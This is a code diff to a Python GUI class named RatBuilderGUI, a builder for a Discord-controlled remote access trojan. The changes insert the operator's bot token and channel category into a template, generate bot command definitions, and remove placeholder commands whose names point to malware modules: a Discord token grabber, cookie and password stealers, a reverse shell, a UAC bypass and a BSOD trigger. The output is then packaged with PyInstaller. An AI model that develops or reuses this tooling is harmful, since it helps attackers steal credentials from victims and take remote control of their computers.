@@ -351,6 +351,7 @@ class RatBuilderGUI(QMainWindow):
                 
                 # Add command definition
                 command_definitions.append(f"""
+
 @bot.command()
 async def {command_name}(ctx):
 {self.indent_code(command_code)}
@@ -360,15 +361,47 @@ async def {command_name}(ctx):
                 self.output_text.append(f"Warning: Command file not found: {command_path}")
         
         # Replace placeholders in template
+        # Replace placeholders in template
         template_content = template_content.replace(
             'category_id="replaceme --> in builder category id"',
             f'category_id="{category_id}"'
         )
-        
+
         template_content = template_content.replace(
             "bot.run('bot token here-->replace')",
             f"bot.run('{token}')"
         )
+        
+        # Remove placeholder command definitions (the ones at the bottom of the file)
+        # These are the placeholder commands that need to be removed
+        placeholder_commands = [
+            '@bot.command()\nasync def tkn_grab(ctx):#done\n    filename="discord_token_grabber.py"',
+            '@bot.command()\nasync def bsod(ctx):#done\n    filename="bsod.py"',
+            '@bot.command()\nasync def get_cookies(ctx):#done\n    filename="get_cookies.py"',
+            '@bot.command()\nasync def pass_light(ctx):#done\n    filename="passwords_grabber.py"',
+            '@bot.command()\nasync def pass_heavy(ctx,bot_k,cat_id):#done\n    filename="gruppe.py"',
+            '@bot.command()\nasync def reverse_shell(ctx):#done\n    filename="reverse_shell"',
+            '@bot.comnand()\nasync def uac(ctx):\n    filename="uac_bypass.py"'
+        ]
+        
+        for placeholder in placeholder_commands:
+            template_content = template_content.replace(placeholder, '')
+        
+        # Also remove individual lines if the multi-line approach doesn't catch them
+        template_content = template_content.replace('@bot.command()\nasync def tkn_grab(ctx):#done', '')
+        template_content = template_content.replace('    filename="discord_token_grabber.py"', '')
+        template_content = template_content.replace('@bot.command()\nasync def bsod(ctx):#done', '')
+        template_content = template_content.replace('    filename="bsod.py"', '')
+        template_content = template_content.replace('@bot.command()\nasync def get_cookies(ctx):#done', '')
+        template_content = template_content.replace('    filename="get_cookies.py"', '')
+        template_content = template_content.replace('@bot.command()\nasync def pass_light(ctx):#done', '')
+        template_content = template_content.replace('    filename="passwords_grabber.py"', '')
+        template_content = template_content.replace('@bot.command()\nasync def pass_heavy(ctx,bot_k,cat_id):#done', '')
+        template_content = template_content.replace('    filename="gruppe.py"', '')
+        template_content = template_content.replace('@bot.command()\nasync def reverse_shell(ctx):#done', '')
+        template_content = template_content.replace('    filename="reverse_shell"', '')
+        template_content = template_content.replace('@bot.comnand()\nasync def uac(ctx):', '')
+        template_content = template_content.replace('    filename="uac_bypass.py"', '')
         
         # Insert command definitions before the bot.run line
         commands_section = '\n'.join(command_definitions)
@@ -393,7 +426,6 @@ async def {command_name}(ctx):
         
         self.output_text.append(f"Generated Python file: {os.path.basename(python_filename)}")
         return python_filename
-    
     def find_pyinstaller(self):
         """Find PyInstaller executable in system PATH or common locations"""
         # Try direct import first (if pyinstaller is installed as module)
